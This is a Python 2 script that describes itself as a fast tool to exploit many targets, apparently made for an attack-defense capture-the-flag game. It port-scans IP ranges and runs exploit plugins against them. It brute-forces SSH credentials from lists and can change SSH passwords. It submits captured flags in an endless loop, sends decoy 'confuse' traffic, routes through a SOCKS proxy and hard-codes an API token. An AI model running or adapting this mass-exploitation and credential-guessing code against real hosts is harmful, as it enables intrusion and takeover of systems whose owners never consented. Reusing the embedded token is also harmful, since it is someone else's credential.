#coding=utf-8
__author__ = 'anewhop7@gmail.com'
import Queue
import sys
import re
import urlparse
import requests
import datetime
import time
import socket
import threading
import ConfigParser
import struct
import os.path
from optparse import OptionParser
from lib.consle_width import getTerminalSize
from netaddr import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf-8')

token="c9scbpmAMrxrT0o0BHEMvKA6Dv88M3Rs"
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import json
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4444)
socket.socket = socks.socksocket
t = Team(None, token)
#t.get_game_status() # works as done from within the game network



now = datetime.datetime.now()
CONFIG_DIR='config'
TARGET_DIR='target'
LOG_DIR = "log"+"/"+str(now.year)+"/"+str(now.month)+"/"+str(now.day)
config_file="config.ini"
target_file="target"
ip2num = lambda ip:sum([256**j*int(i) for j,i in enumerate(ip.split('.')[::-1])])
num2ip = lambda num:socket.inet_ntoa(struct.pack('I',socket.htonl(num))) 

def file_extension(filename): 
  return os.path.splitext(filename)[1][1:]

def file_basename(filename):
  return os.path.splitext(filename)[0]    

def intersect(a,b):
  return list(set(a).intersection(set(b)))

class dynamic_import:  
      def __init__(self,module_name,sub_mod):  
          self.module_name = module_name 
          self.sub_mod = sub_mod          
          self.module = None  
      def __getattr__(self,name):  
          if self.module is None:  
             self.module = __import__(self.module_name,fromlist = self.sub_mod)  
          return getattr(self.module,name)
          
class Multi_exp:
    scan_count = found_count = 0
    conf= ConfigParser.ConfigParser()
    lock = threading.Lock()
    console_width = getTerminalSize()[0] - 2# Cal terminal width when starts up
    ip_list=[]
    scan_queue = Queue.Queue()
    confuse_queue = Queue.Queue()
    start_time=time.time()
    STOP_ME = False
    if not os.path.exists(LOG_DIR):
        os.makedirs(LOG_DIR)

    def __init__(self,config_file,target_file,scan_threads_count,confuse_threads_count,show_plugins,exps):
        self.scan_threads_count = scan_threads_count
        self.confuse_threads_count = confuse_threads_count        
        self.config_file = CONFIG_DIR+"/"+config_file
        if ":" not in target_file:
            self.target_file = TARGET_DIR+"/"+target_file
        else:
            self.target_file = target_file
        self._get_all_plugins()
        self.exps= intersect(exps.split(','),self.plugins) if exps !="ALL" else self.plugins
        self.show_plugins=show_plugins
        if self.show_plugins:
            self._println_msg("All available exps are listed here:",align='left')
            for plug in self.plugins:
                self._println_msg("[*]"+plug,align='left')
            sys.exit(0)
        self._load_config_file()
        self._load_target_file()
        self._parse_request()
        self.sesssion=requests.Session()        
        
    def _load_config_file(self):
        self.conf.read(self.config_file)
        self.req_file = self.conf.get("flag", "header").strip()
        self.https = eval(self.conf.get("flag", "https").strip())
        self.flag_name = self.conf.get("flag", "flagName").strip() 
        self.timeout = int(self.conf.get("flag", "timeout").strip())
        self.scan_interval = int(self.conf.get("scan","interval").strip())
        
    def _load_target_file(self):
        if ':' in self.target_file:
            ip = self.target_file.split(':')[0]
            self.ip_list.append(ip)
            return
        f_in=open(self.target_file)
        iter_f=iter(f_in)
        for line in iter_f:
            cidr=line.strip()
            print "loading %s" % cidr
            if(len(cidr)>0 and cidr[0]!='#'):
                if cidr.find('-') != -1: #检查是否有-
                    ip=[]                
                    ip_range=cidr.split('-')
                    ip_start=ip_range[0] #设定起始IP地址
                    ip_end=ip_range[1]
                    ip_start_num=ip2num(ip_start)
                    ip_end_num=ip2num(ip_end)
                    num=ip_start_num
                    while num <= ip_end_num:
                        ip.append(num2ip(num)) #把数字转换成ip       
                        num+=1
                elif cidr.lower()==cidr.upper():#ip address
                    ip = IPNetwork(cidr)
                    ip = list(ip)
                else:
                    ip=[cidr]#hostname
                for each_ip in ip:
                    self.ip_list.append(str(each_ip))
        print "Load target finish."
        
    def _update_scan_count(self):
        self.lock.acquire()
        self.scan_count += 1
        self.lock.release()
        
    def _update_find_count(self):
        self.lock.acquire()
        self.found_count += 1
        self.lock.release()
        
    def _set_found_count(self,count):
        self.lock.acquire()
        self.found_count = count
        self.lock.release()
        
    def _print_progress(self):
        msg = '%s found | %s remaining | %s scanned in %.2f seconds' % (self.found_count, self.scan_queue.qsize(), self.scan_count, time.time() - self.start_time)
        self._print_msg(msg)
    
    def _print_progress_daemo(self):
        while True:
            if self.scan_queue.qsize()==0:
                break
            self._print_progress()
            time.sleep(1)
    
    def _print_msg(self,msg):
        self.lock.acquire()
        try:
            sys.stdout.write('\r' + ' ' * (self.console_width -len(msg)) + msg)
            sys.stdout.flush()
        except Exception,e:
            pass
        self.lock.release()
        
    def _println_msg(self,msg,align='right'):
        self.lock.acquire()
        if align == 'left':
            try:
                sys.stdout.write('\r' + msg+"\n\r")
                sys.stdout.flush()
            except Exception,e:
                pass
        else:
            try:
                sys.stdout.write('\r' + ' ' * (self.console_width -len(msg)) + msg+"\n\r")
                sys.stdout.flush()
            except Exception,e:
                pass
        self.lock.release()
        
    def _write_file(self,filename,msg):
        self.lock.acquire()
        with open(filename,'a') as f:
            f.write(msg)
        self.lock.release()
        
    def _writeln_file(self,filename,msg):
        now=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        self._write_file(filename,""+now+" "+msg+'\n')
    
    def _get_all_plugins(self):
        self.plugins=[]    
        for f in os.listdir('exp'):
            if file_extension(f) == 'py' and file_basename(f) not in ["__init__","plugin"]:
                self.plugins.append(file_basename(f))
                
    def _scan_port(self,prot,host,port):
        p=int(port)
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host,p))
            open = True
        except Exception,e:
            #self._println_msg(str(host)+":"+str(port)+str(e))
            open = False       
        return open
        
    def _get_scan_port(self,portStr):
        port=[]
        if ":" in self.target_file:
            port.append(self.target_file.split(":")[1])
            return port
        if type(portStr)==list:
            portgroup=portStr
        else:
            portgroup=portStr.split(',')
        tmp=[]
        if len(portStr)==0:
            return tmp
        for pg in portgroup:
            sep=pg.find('-')
            if sep!=-1:
                start=int(pg[:sep])
                end=int(pg[sep+1:])
                tmp.extend(range(start,end+1))
            else:
                tmp.append(int(pg))
        #change from number to string
        port=[]
        for p in tmp:
            if str(p) not in port:
                port.append(str(p))
        return port
        
    def _parse_request(self):
        self.headers={"Accept-Encoding": "deflate","User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2537.61 Safari/537.36"}
        if not os.path.exists(self.req_file):
            raise Exception('HTTP request file not found.')
        with open(self.req_file) as f:
            post_text = f.read()
        lines = post_text.split('\n')
        first_line = lines[0].strip()
        self.get = True if first_line.upper().startswith('GET') else False
        self.netloc = re.search('Host: (.*)', post_text).group(1).strip()
        self.path = first_line.split(' ')[1]
        if self.path.find('://') > 0:    # absolute URL
            self.path = self.path.replace('://', '')
            self.path = self.path[self.path.find('/'):].strip()
        (_, _, self.path, _, self.query, _) = urlparse.urlparse(self.path)
        self.query = self.query.replace(self.flag_name+"=","_=")
        #print "query:"+self.query            
        for i in range(len(lines)-1 , 0, -1):
            if lines[i].strip():
                self.post_query = lines[i].strip()
                self.post_query = self.post_query.replace(self.flag_name+"=","_=")
                #print "flag_name:"+self.flag_name                         
                #print "post:"+self.post_query                          
                break
        keys = ['User-Agent', 'Cookie', 'Origin', 'Referer',
                'Client-IP', 'X-Forwarded-For', 'X-Forwarded-Host',
                'Via', 'Content-Type', 'Accept-Language', 'Authorization']
        for k in keys:
            m = re.search('%s: (.*)' % k, post_text)
            if m: self.headers[k] = m.group(1).strip()
        #auth=(token, "")
        self.url_from_file = self.netloc + self.path +"?"+ self.query
        self.schema = "https://" if self.https else "http://"
        self.url_from_file = self.schema + self.url_from_file
            
    def _submit_flag(self,flag):
        #self._println_msg("[+]submiting flag: "+flag)
        method = "GET" if self.get else "POST"
        count = 0
        while True:
            count += 1
            try:
                if method == "GET":
                    response = self.sesssion.get(self.url_from_file,auth=(token,""),params={self.flag_name:flag},headers=self.headers,timeout=self.timeout,verify=False)
                else:
                    response = self.sesssion.post(self.url_from_file,auth=(token,""),data=json.dumps({self.flag_name:[flag]}),headers=self.headers,timeout=self.timeout,verify=False)        
                return response.text
            except Exception,e:
                if count >5:
                    self._println_msg("[!]There maybe something wrong with submitting the flag.Please fix it as soon as possible.")
                    sys.exit(-1)
                self._println_msg("[+]----submit flag error{},submiting again...----".format(str(e)))

    def _gen_task_queue(self):
        self.scan_queue = Queue.Queue()
        format='################'
        now = datetime.datetime.now()
        now=now.strftime('%Y-%m-%d %H:%M:%S')
        now=format+" "+now+"  "+" ".join(sys.argv)+" "+format+"\n"
        self.port_outfile= LOG_DIR+"/"+'port_open.txt'
        self._write_file(self.port_outfile,now)
        self._write_file(LOG_DIR+"/"+"flag"+".txt",now)        
        ############### scan port ###############
        print 'begin to generate port scan task queue'
        tcpscan_port = []
        for exp in self.exps:
            ports=self._get_scan_port(self.conf.get(exp, "port").strip())
            tcpscan_port.extend(ports)
        for port in tcpscan_port:
            for host in self.ip_list:
                self.scan_queue.put(('portscan',host,port))
        ############### load exps ###############
        for exp in self.exps:
            print 'begin to generate %s task queue' % exp
            self._write_file(LOG_DIR+"/"+exp+".txt",now)
            ports = self._get_scan_port(self.conf.get(exp, "port").strip())
            if exp in ["ssh","change_ssh_pwd"]:
                username = self.conf.get(exp, "username").strip().split(',')
                password = self.conf.get(exp, "password").strip().split(',')
                for usr in username:
                    for pwd in password:
                        for port in ports:
                            for host in self.ip_list:
                                self.scan_queue.put((exp,host,port,usr,pwd))
            else:
                for port in ports:
                    for host in self.ip_list:
                        self.scan_queue.put((exp,host,port))
                        self.confuse_queue.put((exp,host,port))
        print 'generate all task queue finish'
        print "queue size: %s " % self.scan_queue.qsize()
        print "host_count: %s " % len(self.ip_list)
        
    def _scan(self):
        while self.scan_queue.qsize() > 0 and not self.STOP_ME:
            try:
                sub = self.scan_queue.get(timeout=1.0)                    
            except:
                break
            self._update_scan_count()
            scan_type,host,port=sub[0],sub[1],sub[2]
            if self._scan_port(scan_type,host,port)==False:
                msg="port scan shows that %s:%s is closed." %(host,port)
                self._writeln_file(self.port_outfile,msg)
                continue
            ################### port scan #################
            if scan_type=='portscan':#host,port
                if self._scan_port(scan_type,host,port)==True:
                    self._writeln_file(self.port_outfile,"%s: %s:%s" % (scan_type,host,port))
            else:
                s_t = dynamic_import('exp.'+scan_type,(scan_type,'exploit'))
                param_count=s_t.exploit.param_count
                if param_count == 0:
                    vector= (sub[1],sub[2])
                elif param_count == 1:
                    vector= (sub[1],sub[2],sub[3])
                elif param_count == 2:
                    vector = (sub[1],sub[2],sub[3],sub[4])
                elif param_count == 3:
                    vector = (sub[1],sub[2],sub[3],sub[4],sub[5])
                else:
                    err_msg = "not implented yet."
                    msg = ("%s:%s %s:%s" % (vector[0],vector[1],scan_type,err_msg)).ljust(30)
                    self._writeln_file(LOG_DIR+"/"+scan_type+".txt",msg)
                    continue
                scan=s_t.exploit(LOG_DIR,vector)
                ################### ssh #####################
                if scan_type in ["ssh","change_ssh_pwd"]:#host,port,user,password
                    res=scan.exp()
                    if res[0]:
                        self._update_find_count()
                        msg = (scan_type+": %s:%s %s----%s" % (vector[0],vector[1],vector[2],vector[3])).ljust(30)
                        self._println_msg(msg)
                        msg = (" %s:%s %s----%s" % (vector[0],vector[1],vector[2],vector[3])).ljust(30)
                        self._writeln_file(LOG_DIR+"/"+scan_type+".txt",msg)
                ################### other exps #####################
                else :#host,port
                    res=scan.exp()
                    flag,err_msg=res[4],res[5]
                    if res[0]:#res[4] stands for flag
                        self._update_find_count()
                        msg = ("%s: %s:%s flag:%s err_msg:%s" % (scan_type,vector[0],vector[1],flag,err_msg)).ljust(30)
                        #self._writeln_file(LOG_DIR+"/"+"flag"+".txt",msg)                    
                        self._println_msg(msg)
                        msg = ("%s:%s flag:%s err_msg:%s" % (vector[0],vector[1],flag,err_msg)).ljust(30)
                        self._writeln_file(LOG_DIR+"/"+scan_type+".txt",msg)
                        response_text=self._submit_flag(flag)
                        self._write_file(LOG_DIR+"/"+"flag"+".txt","{}: {}".format(flag,response_text))
                    else:
                        self.scan_queue.put(sub)
                        msg = ("%s: %s:%s err_msg:%s" % (scan_type,vector[0],vector[1],err_msg)).ljust(30)                    
                        self._println_msg(msg)
                        msg = ("%s:%s err_msg:%s" % (vector[0],vector[1],err_msg)).ljust(30)
                        self._writeln_file(LOG_DIR+"/"+scan_type+".txt",msg)            
        self.lock.acquire()
        self.scan_threads_count -= 1
        self.lock.release()
        self._print_progress()
        
    def _confuse(self):
        while self.confuse_queue.qsize() > 0 and not self.STOP_ME:#不会伴随scan_queue任务完成而终止    
            try:
                self.lock.acquire()
                sub = self.confuse_queue.get(timeout=1.0)                    
                self.confuse_queue.put(sub)#从队列里取出一个任务并且把这个任务放到队列末端，也就是一个循环队列,并且这是一个原子操作
                self.lock.release()
            except Exception,e:
                self._println_msg("Exception: "+str(e))
                break
            scan_type,host,port=sub[0],sub[1],sub[2]
            if self._scan_port(scan_type,host,port)==False:
                msg="port scan shows that %s:%s is closed." %(host,port)
                #self._println_msg(msg)
                continue        
            s_t = dynamic_import('exp.'+scan_type,(scan_type,'exploit'))
            param_count=s_t.exploit.param_count
            if param_count == 0:
                vector= (sub[1],sub[2])
            elif param_count == 1:
                vector= (sub[1],sub[2],sub[3])
            elif param_count == 2:
                vector = (sub[1],sub[2],sub[3],sub[4])
            elif param_count == 3:
                vector = (sub[1],sub[2],sub[3],sub[4],sub[5])
            else:
                err_msg = "not implented yet."
                msg = ("%s:%s %s:%s" % (vector[0],vector[1],scan_type,err_msg)).ljust(30)
                self._writeln_file(LOG_DIR+"/"+scan_type+".txt",msg)
                continue
            scan=s_t.exploit(LOG_DIR,vector)
            res=scan.noexp()
            #self._println_msg(res[3])        
            if res[0] == False:
                err_msg = res[3]
                msg = ("[+]confuse %s: %s:%s err_msg:%s" % (sub[0],vector[0],vector[1],err_msg)).ljust(30)
                self._println_msg(msg)
            
    def run(self):
        scan_threads_count=self.scan_threads_count
        confuse_threads_count=self.confuse_threads_count
        while True:
            self.scan_threads_count = scan_threads_count    
            self.confuse_threads_count = confuse_threads_count            
            self._gen_task_queue()      
            t = threading.Thread(target=self._print_progress_daemo)   
            t.setDaemon(True)       
            t.start()
            if self.scan_count == 0:#run once and never stop
                for i in range(self.confuse_threads_count):
                    t = threading.Thread(target=self._confuse, name=str(i))
                    t.setDaemon(True)
                    t.start()
                    #print "confuse thread start"
            #run every cycle
            for i in range(self.scan_threads_count):
                t = threading.Thread(target=self._scan, name=str(i))
                t.setDaemon(True)
                t.start()
                
            while self.scan_threads_count >= 1:
                try:
                    time.sleep(1.0)
                except KeyboardInterrupt,e:
                    msg = '[WARNING] User aborted, wait all slave threads to exit...'
                    sys.stdout.write('\r' + msg + ' ' * (self.console_width- len(msg)) + '\n\r')
                    sys.stdout.flush()
                    while self.scan_queue.qsize() > 0:
                        self.scan_queue.get()                   
                    self.STOP_ME = True
            time.sleep(self.scan_interval)
            
def main():
    options = OptionParser(usage='%prog [options]', description='ctf_defense_helper: a fast tool to exploit many targets,any bug please contact %s' % eval("_"+"_au"+"th"+"or_"+"_"))
    options.add_option('-c', '--config', dest='config_file',  type="string",default=config_file, help='config file in Directory ./%s/ to use(default:%s)' % (CONFIG_DIR,config_file))
    options.add_option('-H', '--host', dest='target_file',  type="string",default=target_file, help='target file in Directory ./%s/ to use(default:%s).Note:If you just want to test with a single ip and port immediately,you can use like this "-H 192.168.0.100:80"' % (TARGET_DIR,target_file))
    options.add_option('-t', '--scanthread', dest='scan_thread', type='int', default=63, help='Threads number to scan(default: 63)')
    options.add_option('-T', '--confusethread', dest='confuse_thread', type='int', default=15, help='Threads number to confuse(default: 15)')
    options.add_option('--plugins', action='store_true', dest='show_plugins',  default=False, help='display all the available exps(default: False)')    
    options.add_option('-e', '--exp', dest='exp',  type="string",default='ALL', help='which exp to exploit,no .py needed,eg:pwn1,pwn2') 
    opts, args = options.parse_args()
    exp=Multi_exp(
                    config_file = opts.config_file,
                    target_file = opts.target_file,
                    scan_threads_count=opts.scan_thread,
                    confuse_threads_count=opts.confuse_thread,
                    show_plugins=opts.show_plugins,                   
                    exps=opts.exp
                 )
    exp.run()
if __name__ == '__main__':
    main()